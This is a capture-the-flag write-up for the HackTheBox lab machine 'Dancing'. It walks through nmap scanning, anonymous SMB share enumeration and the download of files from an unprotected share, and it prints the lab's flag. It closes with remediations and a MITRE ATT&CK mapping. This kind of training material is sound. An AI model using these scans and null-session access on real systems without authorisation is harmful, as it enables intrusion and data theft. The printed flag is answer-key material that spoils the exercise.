# Dancing — HackTheBox Starting Point

**Platform:** HackTheBox — Starting Point  
**OS:** Windows  
**Difficulty:** Very Easy  
**Date:** 26 September 2026  
**Flag:** 5f61c10dffbc77a704d76016a22f1664  

---

## Summary

Windows machine with SMB shares accessible without
authentication (null session). Enumerating the shares
reveals a WorkShares folder where sensitive files
including the flag are stored with no access control.

**Attack chain:** nmap → SMB null session → list shares
→ WorkShares accessible → navigate to James.P →
download flag.txt → flag

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sS --min-rate 5000 -p- 10.129.236.60 -oN Dancing
```

PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
5985/tcp open wsman


Key ports:
- 445 → SMB — main attack surface
- 5985 → WinRM — potential access with valid credentials
- 135/139 → RPC and NetBIOS — supporting SMB

No Kerberos (88) or LDAP (389) — this is a Windows
standalone machine, not a Domain Controller.

---

## Enumeration

### List SMB Shares (null session)

```bash
smbclient -L //10.129.236.60 -N
```

Sharename Type Comment

ADMIN$ Disk Remote Admin
C$ Disk Default share
IPC$ IPC Remote IPC
WorkShares Disk


Four shares found:
- ADMIN$ → requires Administrator credentials
- C$ → requires Administrator credentials
- IPC$ → inter-process communication, not useful here
- WorkShares → no comment, no credentials required ← target

### Enumerate with enum4linux

```bash
enum4linux -a 10.129.236.60
```

Result: null sessions allowed, share enumeration confirmed.
User enumeration blocked (ACCESS_DENIED) — not needed
since WorkShares is already accessible.

---

## Exploitation

### Access WorkShares without credentials

```bash
smbclient //10.129.236.60/WorkShares -N
```

Try "help" to get a list of possible commands.
smb: >


### Navigate and enumerate

```bash
smb: \> ls
```

. D 0 Mon Mar 29 10:22:01 2021
.. D 0 Mon Mar 29 10:22:01 2021
Amy.J D 0 Mon Mar 29 11:08:24 2021
James.P D 0 Thu Jun 3 10:38:03 2021


Two user folders found. Investigating each:

```bash
smb: \> cd Amy.J
smb: \Amy.J\> ls
```

worknotes.txt A 94 Fri Mar 26 12:00:37 2021


```bash
smb: \Amy.J\> get worknotes.txt
smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
```

flag.txt A 32 Mon Mar 29 11:26:57 2021


```bash
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

### Read downloaded files

```bash
cat worknotes.txt
```

start apache server on the linux machine
secure the ftp server
setup winrm on dancing


Internal admin notes exposing infrastructure details —
critical information disclosure finding.

```bash
cat flag.txt
```

5f61c10dffbc77a704d76016a22f1664


---

## Post-Exploitation

No shell obtained — SMB access provides file read/download
capability only. However, the worknotes.txt file reveals
internal infrastructure details:

- A Linux machine running Apache (web server)
- An FTP server in the environment
- WinRM configured on this machine (port 5985 confirmed)

This information would be valuable in a real engagement
for lateral movement and further network enumeration.

---

## Findings

| # | Vulnerability | Severity | CVE/CWE | Remediation |
|---|---|---|---|---|
| 1 | SMB share accessible without credentials (null session) | Critical | CWE-284 | Require authentication for all SMB shares — disable null sessions |
| 2 | Sensitive files exposed in WorkShares | Critical | CWE-732 | Apply proper file permissions — restrict access by user and group |
| 3 | Admin notes (worknotes.txt) exposing infrastructure | High | CWE-200 | Never store infrastructure notes in shared network folders |
| 4 | SMB Signing disabled | High | CWE-300 | Enable SMB Signing to prevent relay attacks |
| 5 | WinRM exposed on port 5985 | Medium | CWE-284 | Restrict WinRM access by IP address via firewall rules |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595.001 |
| Discovery | Network Share Discovery | T1135 |
| Discovery | File and Directory Discovery | T1083 |
| Collection | Data from Network Shared Drive | T1039 |
| Collection | Data from Local System | T1005 |

